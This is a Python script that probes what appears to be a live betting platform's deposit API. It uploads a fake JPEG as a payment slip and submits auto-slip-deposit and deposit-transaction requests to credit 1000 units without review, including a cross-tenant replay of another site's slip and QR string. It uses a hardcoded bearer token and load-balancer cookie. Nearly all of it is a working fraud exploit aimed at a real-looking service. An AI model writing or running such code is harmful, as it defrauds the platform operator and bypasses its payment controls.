#!/usr/bin/env python3
"""probe_auto_slip.py — Replicate /mb/auto-slip-deposit flow on vak88z2.

   From we88c traffic: auto-slip-deposit auto-approves without BO review.
   Flow: sign-url-upload-slip → PUT to GCS → auto-slip-deposit → wallet check.
"""
import json, pathlib, time, uuid, requests

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

# vak88z2 bank IDs (from working deposit flow)
BANK_INFO  = "18a9502b-94ae-4188-8841-094be8b3b974"
DEP_ACCT   = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
HDR = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json",
       "template": "vn", "Cookie": f"AWSALB={AWSALB}"}

# Minimal valid JPEG (1x1 pixel)
FAKE_JPEG = (
    b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    b'\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    b'\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9=82<.342\x1e\x1f'
    b'\x1e\x1c\x1f\x1f\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b'
    b'\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04'
    b'\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13Qa'
    b'\x07"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0$3br'
    b'\x82\t\n\x16\x17\x18\x19\x1a%&\'()*456789:CDEFGHIJ'
    b'STUVWXYZ'
    b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xfb\xd4P\x00\x00\x00\xff\xd9'
)

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet before: {wallet()}")

# ── Step 1: Get signed upload URL ─────────────────────────────────────────────
print("\n=== Step 1: sign-url-upload-slip ===")
sign_payload = {"filename": "slip.jpeg", "content_type": "image/jpeg", "size": len(FAKE_JPEG)}
r = requests.post(f"{MGAPI}/mb/sign-url-upload-slip", headers=HDR, json=sign_payload, timeout=15)
print(f"  HTTP {r.status_code}: {r.text[:300]}")

slip_filename = None
upload_url    = None
if r.ok:
    d = r.json()
    slip_filename = d.get("filename", "")
    upload_url    = d.get("urlUpload", "")
    print(f"  slip_filename: {slip_filename}")
    print(f"  upload_url: {upload_url[:80]}...")

# ── Step 2: Upload slip to GCS ────────────────────────────────────────────────
gcs_ok = False
if upload_url:
    print("\n=== Step 2: PUT slip to GCS ===")
    r2 = requests.put(upload_url,
                      headers={"Content-Type": "image/jpeg"},
                      data=FAKE_JPEG,
                      timeout=30)
    print(f"  HTTP {r2.status_code}: {r2.text[:200]}")
    gcs_ok = r2.status_code in (200, 204)

# ── Step 3: POST /mb/auto-slip-deposit ────────────────────────────────────────
print("\n=== Step 3: auto-slip-deposit ===")

# We88c had a qr_string — try with and without
auto_payloads = []

if slip_filename:
    auto_payloads.append({
        "payment_bank_information_id": BANK_INFO,
        "deposit_amount": 1000,
        "note": "",
        "deposit_account_id": DEP_ACCT,
        "slip_image_url": slip_filename,
        "qr_string": "",
    })
    auto_payloads.append({
        "payment_bank_information_id": BANK_INFO,
        "deposit_amount": 1000,
        "deposit_account_id": DEP_ACCT,
        "slip_image_url": slip_filename,
    })

# Also try with the we88c slip filename directly (cross-tenant replay)
auto_payloads.append({
    "payment_bank_information_id": BANK_INFO,
    "deposit_amount": 1000,
    "deposit_account_id": DEP_ACCT,
    "slip_image_url": "7658b94f-de87-46d1-a58b-f0e4c08776a8.png",
    "qr_string": "0041000600000101030040220016282111918DTF096805102TH91047683",
})

for i, pl in enumerate(auto_payloads):
    r3 = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR, json=pl, timeout=15)
    print(f"  [{i}] HTTP {r3.status_code}: {r3.text[:300]}")

# ── Step 4: upload-slip (metadata) ────────────────────────────────────────────
if slip_filename and gcs_ok:
    print("\n=== Step 4: upload-slip (metadata) ===")
    r4 = requests.post(f"{MGAPI}/mb/upload-slip", headers=HDR,
                       json={"filename": slip_filename,
                             "fileOriginalName": "slip.jpeg",
                             "contentType": "image/jpeg",
                             "size": len(FAKE_JPEG)},
                       timeout=15)
    print(f"  HTTP {r4.status_code}: {r4.text[:200]}")

# ── Also test /mb/deposit-transaction with slip fields ────────────────────────
print("\n=== Bonus: deposit-transaction with slip fields ===")
dep_pl = {
    "payment_bank_information_id": BANK_INFO,
    "deposit_amount": 1000,
    "deposit_account_id": DEP_ACCT,
    "slip_image_url": slip_filename or "7658b94f-de87-46d1-a58b-f0e4c08776a8.png",
    "qr_string": "0041000600000101030040220016282111918DTF096805102TH91047683",
    "auto_approve": True,
}
r5 = requests.post(f"{MGAPI}/mb/deposit-transaction", headers=HDR, json=dep_pl, timeout=15)
print(f"  HTTP {r5.status_code}: {r5.text[:300]}")

print(f"\nwallet after: {wallet()}")
print("=== DONE ===")
